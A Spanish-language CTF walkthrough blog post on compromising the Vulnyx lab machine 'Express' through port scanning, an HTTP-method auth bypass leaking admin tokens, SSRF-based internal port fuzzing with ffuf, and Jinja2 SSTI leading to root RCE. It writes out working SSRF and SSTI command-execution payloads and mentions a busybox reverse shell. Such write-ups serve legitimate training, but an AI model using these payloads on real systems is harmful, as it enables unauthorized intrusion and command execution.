---
title : "Express CTF Walkthrough by loh"
date: 2026-02-11 02:36:14 +0200
categories: [CTF Walkthrough]
tags: [CTF,Walkthrough, Vulnyx, Rustscan, Feroxbuster, Javascript, API, SSRF, Internal Port Fuzzing, SSTI, Jinja2, RCE, Reverse Shell]
---
![logo](/assets/post_img/Express/image.png)

¿Una semanita después y ya tenemos máquina? Parece mentira, pero aquí está Express, una máquina creada por j4ckie0x17. Agradecerle el currazo y todo el contenido que nos ofrece para seguir practicando y aprendiendo.

Comenzamos realizando un escaneo de puertos contra la máquina objetivo **10.0.5.23** utilizando **rustscan**.  Por el momento nos interesa el puerto 80 HTTP dado que no contamos con credenciales iniciales y es una versión nueva.
```bash
┌──(kali㉿kali)-[~/CTF/Express/nmap]
└─$ rustscan -a 10.0.5.23 --ulimit 5000 -- -sCV

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA66jQuAvL9WHltK0kjZyYOD/WZIeC/9k5OsLp+Z9c/jSyrVCkKOjczJiEk4CgQ2PJs12Y7mvCzZLCCXcEte2NU=
|   256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILb6SXvYxgDDUn0+9hqqpqs7qIS8e0PfKKE7/aDWNdCR
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:3D:5C:EE (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Tras identificar el servicio web en el puerto 80, accedemos a la aplicación y comprobamos que se trata de la página por defecto de Apache. Con el objetivo de descubrir rutas ocultas o contenido adicional, realizamos una enumeración de directorios utilizando **feroxbuster**:
```bash
┌──(kali㉿kali)-[~/CTF/Express/content]
└─$ feroxbuster -u http://10.0.5.23/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 0 -t 100 -q
200      GET       25l      127w    10359c http://10.0.5.23/icons/openlogo-75.png
301      GET        9l       28w      311c http://10.0.5.23/javascript => http://10.0.5.23/javascript/
200      GET      368l      933w    10701c http://10.0.5.23/
301      GET        9l       28w      318c http://10.0.5.23/javascript/jquery => http://10.0.5.23/javascript/jquery/
200      GET    10907l    44549w   289782c http://10.0.5.23/javascript/jquery/jquery
Scanning: http://10.0.5.23/
Scanning: http://10.0.5.23/javascript/
Scanning: http://10.0.5.23/javascript/jquery/
```

Los resultados no revelan rutas críticas, únicamente recursos estáticos como `/javascript` o `/icons`.

Siguiendo la metodología habitual de **Vulnyx**, añadimos el dominio `express.nyx` al fichero `/etc/hosts`para ver si el servidor responde de forma distinta. Al acceder a este dominio, observamos una aplicación diferente, lo que confirma la presencia de un **virtual host activo**.
![Webpage](/assets/post_img/Express/1webpage.png)

Abrimos **BurpSuite** para analizar las peticiones generadas por la aplicación. Desde `Target > Site map` identificamos el archivo **`js/api.js`**, que define varios endpoints internos utilizados por el frontend.
![api.js](/assets/post_img/Express/2apijs.png)

Leyendo este archivo conseguimos entender que cada endpoint funciona a su manera, siendo **/api/users** y **/api/admin/availability** los mas llamativos.

El endpoint **/api/users** utiliza una `key` pasada por la URL para acceder a la información, lo que supone una autenticación débil y permite la enumeración de usuarios. A diferencia de los endpoints de música, aquí se manejan datos sensibles.
```javascript
function getUsersWithKey() {
    fetch(`/api/users?key=${secretKey}`)
        .then(response => response.json())
        .then(data => {
            console.log('User list (with key):', data);
        })
        .catch(error => {
            console.error('Error fetching the user list:', error);
        });
}
```

Por su parte, **/api/admin/availability** pertenece a una ruta administrativa y recibe datos controlados por el cliente mediante una petición POST. Al procesar una URL desde el servidor, puede ser vulnerable a **SSRF** u otros fallos de validación, convirtiéndolo en un punto crítico dentro del backend.
```javascript
function checkUrlAvailability() {
    const data = {
        id: 1,
        url: 'http://example.com',
        token: '1234-1234-1234'
    };

    fetch('/api/admin/availability', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('URL status:', data);
    })
    .catch(error => {
        console.error('Error checking the URL availability:', error);
    });
}
```

Al realizar una petición manual con una clave incorrecta...:
```http
GET /api/users?key=prueba HTTP/1.1
Host: express.nyx
Accept-Language: es-ES,es;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

...el servidor responde correctamente con un error `401 Unauthorized`.
```http
HTTP/1.1 401 UNAUTHORIZED
Date: Tue, 10 Feb 2026 01:00:15 GMT
Server: Werkzeug/3.0.4 Python/3.11.2
Content-Type: application/json
Content-Length: 64
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{
  "message": "Unauthorized,wrong key!",
  "result": "error"
}
```

Sin embargo, utilizando BurpSuite y modificando el **método HTTP** de la petición, observamos un comportamiento inesperado: el backend devuelve la lista completa de usuarios sin validar correctamente la autenticación.
![MethodChange](/assets/post_img/Express/3method.png)

Como resultado, obtenemos información sensible como IDs, roles y tokens. Entre ellos destaca el usuario **JESSS**, que posee el rol de **administrador**, convirtiéndose en nuestro objetivo principal.
![MethodChangeResult](/assets/post_img/Express/4methodresult.png) 

El endpoint `/api/admin/availability` pertenece a una ruta administrativa y solo acepta peticiones **POST con contenido JSON**. Si la petición no cumple este formato, el servidor responde con:
```bash
┌──(kali㉿kali)-[~/CTF/Express/content]
└─$ curl -i -X POST http://express.nyx/api/admin/availability
HTTP/1.1 415 UNSUPPORTED MEDIA TYPE
Date: Tue, 10 Feb 2026 01:31:03 GMT
Server: Werkzeug/3.0.4 Python/3.11.2
Content-Type: text/html; charset=utf-8
Content-Length: 215

<!doctype html>
<html lang=en>
<title>415 Unsupported Media Type</title>
<h1>Unsupported Media Type</h1>
<p>Did not attempt to load JSON data because the request Content-Type was not &#39;application/json&#39;.</p>
```

Analizando el archivo `api.js`, identificamos los parámetros esperados por el backend:
- `id`
- `url`
- `token`
```javascript
function checkUrlAvailability() {
    const data = {
        id: 1,
        url: 'http://example.com',
        token: '1234-1234-1234'
    };

    fetch('/api/admin/availability', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    ...
}
```

Replicamos esta petición desde BurpSuite utilizando el **token del usuario administrador**, obteniendo una respuesta válida por parte del servidor. Esto resulta especialmente relevante, ya que el backend **procesa URLs completamente controladas por el cliente**, lo que apunta a una posible vulnerabilidad **SSRF**.
![SSRF](/assets/post_img/Express/5ssrf.png)

Para confirmar la vulnerabilidad, levantamos un servidor HTTP en nuestra máquina atacante. Al enviar una petición al endpoint administrativo apuntando a nuestro servidor, recibimos una conexión entrante desde la máquina víctima, confirmando que el servidor realiza peticiones externas controladas por el usuario. Con esto, **confirmamos SSRF funcional**.

![SSRF2](/assets/post_img/Express/6ssrf-pythonhttp.png)
```bash
┌──(kali㉿kali)-[~/CTF/Express/content]
└─$ python3 -m http.server 8012
Serving HTTP on 0.0.0.0 port 8012 (http://0.0.0.0:8012/) ...
10.0.5.23 - - [10/Feb/2026 02:03:16] "GET / HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```

Aprovechando el SSRF, procedemos a enumerar servicios internos escaneando los puertos locales del servidor (`127.0.0.1`). Para ello, generamos un diccionario con todos los puertos posibles:
```bash
┌──(kali㉿kali)-[~/CTF/Express/content]
└─$ seq 1 65535 > puertos.txt                                                                                                                                                                               
┌──(kali㉿kali)-[~/CTF/Express/content]
└─$ cat puertos.txt | head -n 5                              
1
2
3
4
5
```

Y utilizamos **ffuf** para fuzzear el parámetro `url`, específicamente el puerto de la URL :
```bash
┌──(kali㉿kali)-[~/CTF/Express/content]
└─$ ffuf -w puertos.txt -u http://express.nyx/api/admin/availability \
-X POST -H "Content-Type: application/json" \
-d '{"id": 69, "url": "http://127.0.0.1:FUZZ", "token": "4493-3179-0912-0597"}' -fw 36
________________________________________________

 :: Method           : POST
 :: URL              : http://express.nyx/api/admin/availability
 :: Wordlist         : FUZZ: /home/kali/CTF/Express/content/puertos.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"id": 69, "url": "http://127.0.0.1:FUZZ", "token": "4493-3179-0912-0597"}
 :: Filter           : Response words: 36
________________________________________________

22                      [Status: 200, Size: 176, Words: 16, Lines: 7, Duration: 1038ms]
80                      [Status: 200, Size: 11240, Words: 3439, Lines: 7, Duration: 3697ms]
5000                    [Status: 200, Size: 301, Words: 39, Lines: 7, Duration: 88ms]
9000                    [Status: 200, Size: 280, Words: 50, Lines: 7, Duration: 46ms]
45090                   [Status: 200, Size: 152, Words: 17, Lines: 7, Duration: 60ms]
45280                   [Status: 200, Size: 152, Words: 17, Lines: 7, Duration: 47ms]
:: Progress: [65535/65535] :: Job [1/1] :: 858 req/sec :: Duration: [0:01:20] :: Errors: 0 ::
```

El escaneo revela varios puertos internos abiertos, destacando especialmente el **puerto 9000**, cuya respuesta difiere del resto. 
```html
<form method=\"get\" action=\"/username\">
    <input type=\"text\" name=\"name\" placeholder=\"Enter your name\">\n       
    <input type=\"submit\" value=\"Greet\">\n    
</form>",
```

Al acceder al servicio interno del puerto 9000 mediante SSRF, observamos un formulario que recibe el parámetro `name` por GET y devuelve un saludo dinámico.
![Port9000](/assets/post_img/Express/7-p9000.png)

Después de diferentes pruebas, decidimos realizar una inyección de plantilla mediante un Sniper attack, con la wordlist de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz):
![SniperAttack](/assets/post_img/Express/8-sniperattack.png)

Usando la inyección básica **{{7*'7'}}** , la respuesta del servidor es **7777777**, confirmando una **vulnerabilidad SSTI en Jinja2 sin sandbox**.

![Jinja2](/assets/post_img/Express/9a-jinja2.png)

Dado que el motor de plantillas evalúa expresiones Python sin restricciones, es posible acceder a `builtins`, importar módulos y ejecutar comandos del sistema. Utilizamos el siguiente payload: **{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}**. La salida confirma **ejecución remota de comandos con privilegios de root**.
![RCEid](/assets/post_img/Express/9b-rceid.png)

Finalmente, aprovechamos el RCE para enviarnos una **reverse shell** utilizando herramientas disponibles en el sistema (busybox). Tras establecer la conexión, confirmamos acceso como **root** y procedemos a leer la **flag final**, completando con éxito el compromiso de la máquina.
![RevShell](/assets/post_img/Express/9c-rcerevshell.png)
![RootFlag](/assets/post_img/Express/9d-flag.png)

**Gracias por haber llegado hasta al final, poquito a poquito vamos mejorando y adaptando los conceptos. ¡Un saludo a todos los que me apoyan desde [LinkedIn](https://www.linkedin.com/feed/update/urn:li:activity:7427368197202481153/), realmente me anima a seguir!**

Hasta la próxima,

~loh♡.